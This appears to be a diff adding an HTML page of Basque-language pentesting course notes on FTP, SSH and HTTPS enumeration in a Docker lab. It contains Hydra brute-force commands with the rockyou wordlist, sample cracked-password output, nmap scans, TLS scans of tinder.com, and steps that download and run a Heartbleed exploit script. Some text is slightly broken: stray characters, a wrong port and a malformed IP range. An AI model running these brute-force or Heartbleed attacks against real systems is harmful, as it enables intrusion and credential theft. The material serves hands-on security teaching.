@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>FTP ennumerazioa</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <ul>
+<li><a href="#ftp-ennumerazioa">FTP ennumerazioa</a>
+<ul>
+<li><a href="#docker-pasahitza-duen-ftp-zerbitzaria--hacking-lab-docker-composen-jada-gehituta">Docker Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)</a></li>
+<li><a href="#docker-pasahitzik-gabeko-ftp-zerbitzaria">Docker Pasahitzik gabeko ftp zerbitzaria</a></li>
+<li><a href="#pasahitza-duen-ftp-zerbitzaria-eraso">Pasahitza duen FTP zerbitzaria eraso</a>
+<ul>
+<li><a href="#rock-you-pasahitz-dikzionarioa-deskargatu">Rock you pasahitz dikzionarioa deskargatu</a></li>
+<li><a href="#ftp-zerbitzua-aurkitu-nmap-ekin">FTP zerbitzua aurkitu nmap-ekin</a></li>
+<li><a href="#erasoa-hydra-erabiliz">Erasoa Hydra erabiliz</a></li>
+</ul>
+</li>
+<li><a href="#pasahitzik-gabeko-ftp-zerbitzaria-eraso">Pasahitzik gabeko FTP zerbitzaria eraso</a></li>
+</ul>
+</li>
+<li><a href="#ssh-enumerazioa">SSH Enumerazioa</a>
+<ul>
+<li><a href="#ssh-zerbitzura-konektatu">SSH zerbitzura konektatu</a></li>
+<li><a href="#erasoa-hydra-erabiliz-1">Erasoa Hydra erabiliz</a></li>
+<li><a href="#sistema-eragilearen-bertsioa-ezagutu-ssh-protokoloaren-bertsiotik">Sistema eragilearen bertsioa ezagutu ssh protokoloaren bertsiotik</a></li>
+</ul>
+</li>
+<li><a href="#http-eta-https-enumerazioa">HTTP eta HTTPS enumerazioa</a>
+<ul>
+<li><a href="#tinder-aztertu">Tinder aztertu</a></li>
+<li><a href="#hearbleed-ssl-kalteberatasuna-aztertzen">Hearbleed ssl kalteberatasuna aztertzen</a>
+<ul>
+<li><a href="#nmap-ekin-aztertu-heartbleed-duenik">nmap-ekin aztertu heartbleed duenik</a></li>
+</ul>
+</li>
+<li><a href="#python">Python</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="ftp-ennumerazioa">FTP ennumerazioa</h1>
+<p>Mota honetan, fitxategiak transferitzeko protokoloari (FTP) buruz hitz egingo dugu, eta horri buruzko azterketa nola aplikatu informazioa biltzeko.</p>
+<p>FTP protokolo asko erabiltzen da fitxategiak sareetara transferitzeko. FTP zerbitzuaren zerrendatzeak informazio garrantzitsua biltzea dakar, hala nola FTP zerbitzariaren bertsioa, fitxategien baimenen konfigurazioa, erabiltzaileak eta pasahitzak (indar gordineko erasoen edo guessing-en bidez), besteak beste.</p>
+<p>Jarraian, gela honetan ukitzen dugun lehen proiekturako esteka duzue:</p>
+<h2 id="docker-pasahitza-duen-ftp-zerbitzaria--hacking-lab-docker-composen-jada-gehituta">Docker Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)</h2>
+<p>Docker-FTP-Server: <a href="https://github.com/garethflowers/docker-ftp-server">https://github.com/garethflowers/docker-ftp-server</a></p>
+<p>Deskargatzen dugun lehen proiekturako erabiltzen dugun tresnetako bat &quot;Hydra&quot; da. Hydra kode irekiko sartze-probak egiteko tresna bat da, eta pasahitzak babestutako sistemen eta zerbitzuen aurka indar gordineko erasoak egiteko erabiltzen da. Tresna oso pertsonalizagarria da eta sareko protokolo-sorta zabala onartzen du, besteak beste, HTTP, FTP, SSH, Telnet eta SMTP.</p>
+<p>FTPrako erabiltzaile gonbidatuak autentifikatzea ahalbidetzen duen edukiontzia hedatzeko erabiltzen ditugun proiektuen artean hurrengoa &quot;metabrainz&quot; en &quot;docker-anon-ftp&quot; proiektua da. Jarraian, proiekturako esteka duzue:</p>
+<h2 id="docker-pasahitzik-gabeko-ftp-zerbitzaria">Docker Pasahitzik gabeko ftp zerbitzaria</h2>
+<p>Docker-ANON-FTP: <a href="https://github.com/metabrainz/docker-anon-ftp">https://github.com/metabrainz/docker-anon-ftp</a></p>
+<pre><code class="language-bash">docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro --network=hacking-lab_pentesting-lab-network metabrainz/docker-anon-ftp 
+</code></pre>
+<h2 id="pasahitza-duen-ftp-zerbitzaria-eraso">Pasahitza duen FTP zerbitzaria eraso</h2>
+<h3 id="rock-you-pasahitz-dikzionarioa-deskargatu">Rock you pasahitz dikzionarioa deskargatu</h3>
+<p><a href="https://github.com/zacheller/rockyou">https://github.com/zacheller/rockyou</a></p>
+<pre><code class="language-bash"><span class="hljs-built_in">cd</span>
+git <span class="hljs-built_in">clone</span> https://github.com/zacheller/rockyou
+<span class="hljs-built_in">cd</span> rockyou
+<span class="hljs-built_in">mkdir</span> /usr/share/wordlists
+tar xC /usr/share/wordlists -f rockyou.txt.tar.gz
+</code></pre>
+<h3 id="ftp-zerbitzua-aurkitu-nmap-ekin">FTP zerbitzua aurkitu nmap-ekin</h3>
+<p>Erabili localhost edo sarea + maskara hurrengo aginduan</p>
+<pre><code class="language-bash">nmap -sCV -p20,21 127.18.0.0\16
+</code></pre>
+<p>Honelako erantzunen bat agertu beharko litzateke:</p>
+<pre><code class="language-bash">Nmap scan report <span class="hljs-keyword">for</span> my-ftp-server.hacking-lab_pentesting-lab-network (172.18.0.6)
+Host is up (0.000036s latency).
+
+PORT   STATE  SERVICE  VERSION
+20/tcp closed ftp-data
+21/tcp open   ftp      vsftpd 2.0.8 or later
+MAC Address: 02:42:AC:12:00:06 (Unknown)
+</code></pre>
+<h3 id="erasoa-hydra-erabiliz">Erasoa Hydra erabiliz</h3>
+<pre><code class="language-bash">hydra -l sinfor -P rockyou.txt ftp://172.18.0.6 -t 15
+</code></pre>
+<p>Mayuskula bada dikzionario bat erabiliko du, minuskula bada, parametro hori erabiltzaile/pasahitz gisa erabiliko da.</p>
+<ul>
+<li>-l erabiltzailea dakigu</li>
+<li>-L erabiltzailea dikzionario batetik hartuko du</li>
+<li>-P pasahitz dikzionarioa erabiliz</li>
+<li>-t 15 : 15 thread aldi berean</li>
+</ul>
+<p>Honelako erantzun bat agertu beharko litzateke:</p>
+<pre><code class="language-bash">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-30 12:49:37
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 200 login tries (l:1/p:200), ~14 tries per task
+[DATA] attacking ftp://172.18.0.6:21/
+[21][ftp] host: 172.18.0.6   login: user   password: louise
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-30 12:50:06
+</code></pre>
+<h2 id="pasahitzik-gabeko-ftp-zerbitzaria-eraso">Pasahitzik gabeko FTP zerbitzaria eraso</h2>
+<p>Kasu honetan erabil froga dezakegu zuzenenan Anonymus erabiltzailerarekin edo nmapek eskuragarri duen <code>ftp-anon</code> scriptarekin</p>
+<pre><code class="language-bash">nmap --script ftp-anon -p21 172.18.0.2
+</code></pre>
+<p>Honelako erantzun bat itzuli beharko luke:</p>
+<pre><code class="language-bash">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 13:02 UTC
+Nmap scan report <span class="hljs-keyword">for</span> f0304f75721e.hacking-lab_pentesting-lab-network (172.18.0.2)
+Host is up (0.000037s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+MAC Address: 02:42:AC:12:00:02 (Unknown)
+
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.35 seconds
+</code></pre>
+<h1 id="ssh-enumerazioa">SSH Enumerazioa</h1>
+<p>Gela honetan, SSH (Secure Shell) protokoloa arakatuko dugu, baita zerbitzu hori gauzatzen duten sistemei buruzko informazioa biltzeko azterketa nola egin ere.</p>
+<p>SSH urruneko administrazio-protokolo bat da, erabiltzaileei urrutiko zerbitzariak Internet bidez kontrolatzeko eta aldatzeko aukera ematen diena, autentifikazio-mekanismo seguru baten bidez. Telnet protokoloaren alternatiba seguruago gisa, zifratu gabeko informazioa transmititzen baitu, SSHk teknika kriptografikoak erabiltzen ditu urruneko zerbitzarirako eta zerbitzarirako komunikazio guztiak zifratuta daudela bermatzeko.</p>
+<p>SSHk mekanismo bat eskaintzen du urruneko erabiltzaile bat autentifikatzeko, bezerotik hostera sarrerak transferitzeko eta bezeroari itzultzeko irteera emateko. Hau bereziki erabilgarria da urruneko sistemak modu seguru eta eraginkorrean administratzeko, bertan fisikoki egon behar izan gabe.</p>
+<p>Jarraian, &quot;docker&quot; komando osoa kopiatzen dugun webgunerako esteka zuzena duzue, gure kontenedorea zabaltzeko (jada hacking lab docker composera gehituta dago)</p>
+<p>Docker Hub OpenSSH-Server: <a href="https://hub.docker.com/r/linuxserver/openssh-server">https://hub.docker.com/r/linuxserver/openssh-server</a>
+Nabarmentzekoa da, SSH bertsioaren bidez, sisteman gauzatzen ari den banaketaren kodenam-a ere identifika dezakegula.</p>
+<p>Adibidez, SSH zerbitzariaren bertsioa &quot;OpenSSH 8.2p1 Ubuntu 4ubuntu0.5&quot; bada, sistema Ubuntu banaketa bat exekutatzen ari dela zehaztu dezakegu. &quot;4ubuntu0.5&quot; bertsio-zenbakia Ubuntuko banaketa horretan SSH paketearen berrikuspen espezifikoari dagokio. Hortik abiatuta, Ubunturen banaketaren kodenam-a identifika dezakegu, kasu honetan Ubuntu 20.04rako &quot;Fokala&quot; izango litzatekeena.</p>
+<p>Bilaketa horiek guztiak domeinu honetan aplikatuko ditugu:</p>
+<p>Launchpad: <a href="https://launchpad.net/ubuntu">https://launchpad.net/ubuntu</a></p>
+<h2 id="ssh-zerbitzura-konektatu">SSH zerbitzura konektatu</h2>
+<p>Hurrengo aginduaren bitartez konekta ginateke, adi kontenedorearen izena erabil ahal izateko kali kontenedorearen sare berdinean egon behar dela. Bestela, ip helbidea erabil genezake.</p>
+<pre><code class="language-bash">ssh user@openssh-server -p 2222
+</code></pre>
+<ul>
+<li>user : erabiltzailearen izena</li>
+<li>@openssh-server : serbitzariaren helbidea (izena edo ipea)</li>
+<li>-p 2222 : protokoloa erabiltzen ari den portua (defektuz 22)</li>
+</ul>
+<h2 id="erasoa-hydra-erabiliz-1">Erasoa Hydra erabiliz</h2>
+<p>FTP protokoloarekin bezala, hydra erabiliko dugu rockyou-ko pasahitzak frogatzeko.</p>
+<pre><code class="language-bash">hydra -l sinfor -P /usr/share/wordlists/rockyou.txt ssh://openssh-server -s 2222 -t 15
+</code></pre>
+<ul>
+<li>-l sinfor : erabiltzailea</li>
+<li>-P /usr/share/wordlist/rockyou.txt : pasahitzak (P mayuskula denez, dikzionario bat erabiliko dugu)</li>
+<li>ssh://openssh-server : protokoloa eta zerbitzariaren helbidea (izena edo ipea)</li>
+<li>-s 2222 : Zerbitzariaren ssh portua</li>
+<li>-t 15 : Erasorako erabiliko diren thread kopurua</li>
+</ul>
+<p>Honelako erantzun bat agertu beharko litzateke:</p>
+<pre><code class="language-bash">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-31 09:06:45
+[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 14344398 login tries (l:1/p:14344398), ~956294 tries per task
+[DATA] attacking ssh://openssh-server:2222/
+[2222][ssh] host: openssh-server   login: sinfor   password: louise
+</code></pre>
+<h2 id="sistema-eragilearen-bertsioa-ezagutu-ssh-protokoloaren-bertsiotik">Sistema eragilearen bertsioa ezagutu ssh protokoloaren bertsiotik</h2>
+<p>Nmap erabiliz, eskaneo bat egin dezakegu nmapeko scriptak erabiliz, hurrengo aginduarekin</p>
+<pre><code class="language-bash">nmap -sCV -p2222 openssh-server
+</code></pre>
+<p>Antzerako erantzuna itzuli beharko luke:</p>
+<pre><code class="language-bash">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 09:15 UTC
+Nmap scan report <span class="hljs-keyword">for</span> openssh-server (172.18.0.3)
+Host is up (0.00011s latency).
+rDNS record <span class="hljs-keyword">for</span> 172.18.0.3: openssh-server.hacking-lab_pentesting-lab-network
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 08:0f:46:12:4b:40:b1:16:bf:62:54:23:04:54:bf:65 (ECDSA)
+|_  256 3f:77:a0:1d:6f:b7:59:ea:f2:a6:7a:a5:2a:75:9b:45 (ED25519)
+MAC Address: 02:42:AC:12:00:03 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.61 seconds
+</code></pre>
+<p>Googelen openssh bertsioa + launchpad bilatuz aurki dezakegu sistema eragilearen bertsioa. <a href="https://launchpad.net">launchpad</a></p>
+<p>(ez du kasu guztietarako balio, adibidez aurreko kontendorea alpine linux v3.18 erabiltzen du eta launchpaden ez da aurkitzen)</p>
+<p>Froga egin dezakezue contenedore berri bat sortuz ssh zerbitzuarekin. Hona hemen dockerfile bat froga egiteko:</p>
+<pre><code class="language-bash">FROM ubuntu:14.04
+MAINTAINER Mikel Dalmau aka mdalmau <span class="hljs-string">&#x27;mikeldalmauc@gmail.com&#x27;</span>
+
+EXPOSE 22
+
+RUN apt update &amp;&amp; apt install ssh -y
+
+ENTRYPOINT service ssh start &amp;&amp; /bin/bash
+</code></pre>
+<p>Dockerfile fitxategiaren karpetan kokatuta sortu irudia eta martxan jarri kontenedorea.</p>
+<pre><code class="language-bash">docker build -t nire_ssh_zerbitzaria .
+
+docker run -d -it -p 22:22 --name nireSSHZerbitzaria nire_ssh_zerbitzaria
+</code></pre>
+<p>Frogatu aurreko nmap agundua eta bila googelen launchapad ea vertsioa aurkitzeko gai zaren.</p>
+<h1 id="http-eta-https-enumerazioa">HTTP eta HTTPS enumerazioa</h1>
+<p>HTTP (Hypertext Transfer اl) World Wide Webean datuak transferitzeko erabiltzen den komunikazio-protokoloa da. Testu-edukia, irudiak, bideoak, hiperestekak, etab. transferitzeko erabiltzen da. HTTPrako aurrez zehaztutako portua 80. portua da.</p>
+<p>HTTPS (Hypertext Transfer اl Secure) HTTPren bertsio segurua da, eta SSL/TLSk erabiltzen du bezeroaren eta zerbitzariaren arteko komunikazioa zifratzeko. 443 ataka lehenetsita erabiltzen du. HTTPren eta HTTPSren arteko alde nagusia da HTTPSk segurtasun-geruza gehigarri bat erabiltzen duela datuak zifratzeko, eta horrek seguruago egiten dituela transferentziarako.</p>
+<p>SSL ziurtagiria ikuskatzeko mota honetan ikusten dugun tresnetako bat &quot;Openssl&quot; da. OpenSSL software libreko eta kode irekiko liburutegia da, eta lineako segurtasun-protokoloak ezartzeko erabiltzen da, hala nola TLS (Transport Layer Security), SSL (Secure Sockets Layer). OpenSSL liburutegiak protokolo horiek inplementatzen ditu aplikazioak sarean modu seguruan eta enkriptatuan komunikatu ahal izateko.</p>
+<p>Mota honetan tresna hau erabiltzen ikusten dugun komandoetako bat honako hau da:</p>
+<pre><code class="language-bash">openssl s_client -connect ejemplo o.com: 443
+</code></pre>
+<p>Komando honen bidez, web zerbitzari baten SSL ziurtagiria ikuska dezakegu. Komandoa 433. atakan konektatzen da zerbitzariarekin, eta SSL ziurtagiriari buruzko informazio zehatza erakusten du, hala nola ziurtagiriaren baliozkotasuna, iraungitze-data, zifratze-mota, etab.</p>
+<p>Era berean, klase honetan ikusten ditugun beste tresna batzuk &quot;sslyze&quot; eta &quot;sslscan&quot; dira. Sslyze SSL segurtasuna aztertzeko tresna bat da, zerbitzari baten SSL konfigurazioa ebaluatzeko erabiltzen dena. Erabilitako zifratzeari, onartutako protokoloei eta SSL ziurtagiriei buruzko informazio zehatza ematen du. SSLScan SSL segurtasuna aztertzeko beste tresna bat da, zerbitzari baten SSL konfigurazioa ebaluatzeko erabiltzen dena. Onartutako SSL/TLS protokoloei, erabilitako zifratzeari eta SSL ziurtagiriei buruzko informazio zehatza ematen du.</p>
+<h2 id="tinder-aztertu">Tinder aztertu</h2>
+<p>Webgunean SSL zihurtagiria ikusi:</p>
+<p><img src="..\Images\image-1.png" alt="Alt text">
+<img src="..\Images\image.png" alt="Alt text"></p>
+<p>Terminalean zihurtagiria ikusi:</p>
+<pre><code class="language-bash">openssl s_client -connect tinder.com:443
+</code></pre>
+<p>Sslyze eta sslscan arteko desberdintasun nagusia da sslyze web-zerbitzari baten SSL/TLS segurtasunaren ebaluazioan zentratzen dela, SSL/TLS protokoloen eta konfigurazioen miaketa sakon baten bidez; sslscan, berriz, zerbitzariak onartutako SSL/TLS protokoloen eta erabilitako zifratuen identifikazioan zentratzen da.</p>
+<p>SSL/TLS analisi-tresnek emandako informazioak identifikatzea oso garrantzitsua da, zerbitzari baten konfigurazioan kalteberatasunak detektatzeko eta gure informazio konfidentziala babesteko neurriak hartzeko aukera ematen baitigu.</p>
+<pre><code class="language-bash">sslyze tinder.com
+</code></pre>
+<pre><code class="language-bash">sslscan tinder.com
+</code></pre>
+<h2 id="hearbleed-ssl-kalteberatasuna-aztertzen">Hearbleed ssl kalteberatasuna aztertzen</h2>
+<p>Adibidez, Heartbleed segurtasun-kalteberatasun bat da, OpenSSL liburutegiari eragiten diona eta erasotzaileei zerbitzari zaurgarri baten memorian sartzeko aukera ematen diena. Web zerbitzari bat Heartbleeden kalterako bada eta tresna horien bidez detektatzen badugu, horrek esan nahi du erasotzaile batek informazio konfidentziala eskura dezakeela, hala nola gako pribatuak, erabiltzaile-izenak eta pasahitzak.</p>
+<p>Jarraian, Githuben proiekturako esteka ematen da. Bertan, Heartbleed-era kaltebera den laborategia hedatzen dugu: (jada hacking laboratoriora gehituta)</p>
+<p>CVE-2014-0160: <a href="https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160">https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160</a></p>
+<p>Makina altzatu eta gero, izena/ip + portua erabiliz eskaneatuko dugu.</p>
+<pre><code class="language-bash">sslscan nginx-hearbleed:443
+</code></pre>
+<p>Erantzunean ikus beharko genuke bulnerablea dela.</p>
+<h3 id="nmap-ekin-aztertu-heartbleed-duenik">nmap-ekin aztertu heartbleed duenik</h3>
+<p>Scripta azterketa hau egiteko eskuragarri egon beharko litzateke.</p>
+<pre><code class="language-bash">locate .nse | grep heartbleed
+</code></pre>
+<p>Scripta exekutatu:</p>
+<pre><code class="language-bash">nmap --script ssl-heartbleed -p443 nginx-hearbleed
+</code></pre>
+<h2 id="python">Python</h2>
+<p>Aurreko hearbleed makinako reposiotrioan python script bat uzten digute</p>
+<p>Instalatu python:</p>
+<pre><code class="language-bash">apt install python3 python3-venv
+</code></pre>
+<p>Deskargatu python scripta repositoriotik:</p>
+<pre><code class="language-bash">wget <span class="hljs-string">&#x27;https://github.com/vulhub/vulhub/blob/master/openssl/CVE-2014-0160/ssltest.py?raw=true&#x27;</span> -O ssltest.py
+</code></pre>
+<p>Exekutatu python script, ssl zihurtagiria ikusteko. Ideia, script hau behin eta berriz exekutatzea da eta informazio leakeageak aurkitzea izango litzateke.</p>
+<pre><code class="language-bash">python3 ssltest.py nginx-heartbleed -p 443
+</code></pre>
+<ul>
+<li>-v &quot;00 00 ... 00&quot; parametroa gehituz, kate hau daukaten lerroak izkutatuko dira.</li>
+</ul>
+
+            
+            
+        </body>
+        </html>
